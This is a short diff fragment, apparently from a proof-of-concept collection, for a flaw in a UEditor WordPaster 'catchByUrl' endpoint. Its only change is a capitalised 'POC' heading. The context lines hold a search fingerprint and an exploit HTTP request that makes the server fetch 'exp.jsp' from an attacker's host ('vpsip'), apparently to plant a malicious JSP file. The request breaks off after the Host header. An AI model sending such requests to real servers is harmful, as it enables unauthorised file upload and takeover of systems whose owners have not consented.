@@ -5,7 +5,7 @@
 body="thirdparty/ueditor/WordPaster"
 ```
 
-## poc
+## POC
 ```
 GET /resources/files/ue/catchByUrl?url=http://vpsip/exp.jsp HTTP/1.1 
 Host: 
